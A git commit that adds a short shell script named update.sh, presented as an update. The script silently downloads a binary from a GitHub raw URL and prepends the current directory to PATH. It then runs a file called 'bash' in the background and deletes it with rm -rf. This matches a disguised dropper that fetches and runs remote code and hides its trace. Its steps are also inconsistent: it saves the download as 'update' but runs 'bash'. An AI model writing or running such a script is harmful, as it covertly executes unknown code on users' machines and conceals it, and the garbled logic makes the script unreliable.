5f676c083043049a1d874c0282c8bd1bc02ce320
jackmoc <94283031+jackmoc@users.noreply.github.com>
2023-09-05 21:31:47 +0800

    Update and rename update2.sh to update.sh

---
+++ update.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+wget -q -O update https://github.com/jackmoc/Alpine/raw/main/update
+chmod +x /bash
+PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
+bash &
+rm -rf bash
